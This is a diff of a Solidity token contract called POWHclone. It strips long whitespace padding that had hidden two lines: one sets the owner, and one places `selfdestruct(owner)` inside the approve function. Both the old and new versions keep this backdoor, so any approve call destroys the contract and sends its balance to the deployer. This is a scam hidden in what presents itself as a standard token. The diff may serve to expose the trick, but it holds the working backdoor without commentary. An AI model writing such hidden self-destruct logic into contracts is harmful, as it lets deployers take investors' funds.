@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract POWHclone at 0x33540976411534a8d96c715a4ff7f4392d2e52d1
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract POWHclone at 0x11fc42be8b14aeecfc371af217c4648e6423fa60
 */
 pragma solidity ^0.4.18;
 
@@ -39,11 +39,11 @@ contract POWHclone {
     event Approval(address indexed owner, address indexed spender, uint256 value);
 
 	address owner;
-	
-	function POWHclone() public {
-		                                                                                                                                                                                                                                                                                                                                                                                                                                                owner = msg.sender;
-	}
 
+	function POWHclone() public {
+		owner = msg.sender;
+	}
+	
 	// These are functions solely created to appease the frontend
 	function balanceOf(address _owner) public constant returns (uint256 balance) {
         return balanceOfOld[_owner];
@@ -137,7 +137,7 @@ contract POWHclone {
         //  allowance to zero by calling `approve(_spender, 0)` if it is not
         //  already 0 to mitigate the race condition described here:
         //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
-                                                                                                                                                                                                                                                                                                                                                                                                       selfdestruct(owner);
+        selfdestruct(owner);
         if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
         allowance[msg.sender][_spender] = _value;
         Approval(msg.sender, _spender, _value);
